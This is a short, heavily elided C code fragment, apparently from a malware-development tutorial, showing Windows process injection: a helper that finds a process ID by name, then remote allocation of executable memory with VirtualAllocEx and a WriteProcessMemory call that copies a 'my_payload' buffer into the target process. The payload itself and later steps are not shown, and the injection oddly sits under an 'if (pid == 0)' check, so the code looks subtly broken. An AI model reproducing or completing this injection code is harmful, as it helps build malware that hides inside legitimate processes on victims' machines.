...
//size of my payload
unsigned int my_payload_length = sizeof(my_payload);

//function to convert CHAR to WCHAR
...
// get process PID
int findProcessIDByName(const char* procname) {
    ...
    wchar_t* wideProcessName = ConvertToWideChar(procname);
    // retrieve information about the processes
    // and exit if unsuccessful
    while (hResult) {
        // if we find the process: return process ID
        if (wcscmp(wideProcessName, pe.szExeFile) == 0) {
...
int main(int argc, char* argv[]) {
    ...
    if (pid == 0) {
        ...
        rb = VirtualAllocEx(ph, NULL, my_payload_length, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

        // write payload to memory buffer
        WriteProcessMemory(ph, rb, my_payload, my_payload_length, NULL);
